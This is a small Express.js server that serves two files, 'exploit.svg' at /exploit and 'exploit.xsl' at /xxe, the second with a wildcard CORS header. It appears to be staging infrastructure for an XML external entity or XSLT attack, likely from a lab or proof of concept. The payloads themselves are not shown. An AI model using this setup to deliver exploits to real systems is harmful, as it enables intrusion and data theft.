const express = require('express');
const path = require('path');

const app = express();
const port = 9090;

app.get('/exploit', (req, res) => {
  res.sendFile(path.join(__dirname, 'exploit.svg'));
});

app.get('/xxe', (req, res) => {
  res.set('Access-Control-Allow-Origin', '*');
  res.sendFile(path.join(__dirname, 'exploit.xsl'));
});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});